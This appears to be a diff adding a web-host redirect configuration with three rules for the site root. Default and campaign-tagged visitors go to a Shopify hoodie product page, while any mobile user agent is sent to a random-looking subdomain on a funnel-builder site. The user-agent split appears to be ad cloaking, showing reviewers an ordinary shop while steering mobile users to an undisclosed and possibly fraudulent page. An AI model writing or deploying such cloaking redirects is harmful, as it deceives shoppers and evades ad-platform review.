@@ -1,0 +1,25 @@
+{
+  "redirects": [
+    {
+      "source": "/",
+      "has": [
+        { "type": "query", "key": "utm_campaign", "value": "__AID_NAME__" }
+      ],
+      "destination": "https://workwear-express-online.myshopify.com/collections/hooded-tops/products/jbs-3cfh-contrast-fleecy-hoodie?variant=43854643888315",
+      "statusCode": 302
+    },
+    {
+      "source": "/",
+      "has": [
+        { "type": "header", "key": "user-agent", "value": "(Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini)" }
+      ],
+      "destination": "https://suqiqwopzxkasuewq.myfunnelish.com/tt-ss-hh-pp",
+      "statusCode": 302
+    },
+    {
+      "source": "/",
+      "destination": "https://workwear-express-online.myshopify.com/collections/hooded-tops/products/jbs-3cfh-contrast-fleecy-hoodie?variant=43854643888315",
+      "statusCode": 302
+    }
+  ]
+}
